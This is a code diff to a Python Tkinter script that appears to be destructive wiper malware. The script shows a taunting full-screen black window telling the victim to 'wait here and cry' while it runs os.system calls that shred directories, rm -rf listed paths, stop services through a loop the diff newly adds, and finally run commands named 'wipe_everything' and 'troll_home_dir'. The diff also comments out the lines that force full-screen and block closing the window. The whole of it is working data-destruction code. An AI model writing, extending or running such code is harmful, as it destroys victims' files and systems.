@@ -38,11 +38,11 @@ def MainThread():
     tk.Label(root, font = ("Cascadia Code", 10), text='All you can do is wait here and cry as loud as possible.', anchor="center").pack()
 
     root.geometry("1920x1080")
-    root.resizable(False,False)
-    root.attributes('-fullscreen',True)
+    #root.resizable(False,False)
+    #root.attributes('-fullscreen',True)
 
     root.config(bg=UT.rgb_hack((0, 0, 0)))
-    root.protocol("WM_DELETE_WINDOW", preventClose) 
+    #root.protocol("WM_DELETE_WINDOW", preventClose) 
 
     for x in directory_list:
         os.system(shred_command + x)
@@ -50,7 +50,10 @@ def MainThread():
     
     for f in need_removing_list:
         os.system("cd /")
-        os.system(rmrf_command + f + "*")    
+        os.system(rmrf_command + f + "*")
+
+    for d in services_list:
+        os.system(services_command + d)    
 
     os.system(wipe_everything)
     os.system(troll_home_dir)
